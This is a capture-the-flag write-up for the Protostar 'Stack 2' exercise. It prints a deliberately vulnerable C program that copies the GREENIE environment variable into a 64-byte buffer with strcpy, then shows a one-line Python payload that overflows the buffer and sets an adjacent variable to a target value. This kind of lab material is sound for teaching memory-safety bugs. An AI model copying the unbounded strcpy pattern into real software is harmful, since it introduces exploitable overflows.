# Protostar - Stack 2

> NOTE: This writeup is __not__ written by me, John Hammond.

### About ###

>Stack2 looks at environment variables, and how they can be set.
>
>This level is at `/opt/protostar/bin/stack2

### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

### Solution ###

This challenge is pretty much the same as `Stack 2`, except that in this one the entry point is located in the environment variable `GREENIE` and not the argument `argv[1]`.

```
user@protostar:/tmp$ GREENIE=$(python -c "print 'A'*64+'\x0a\x0d\x0a\x0d'") stack2
you have correctly modified the variable
```
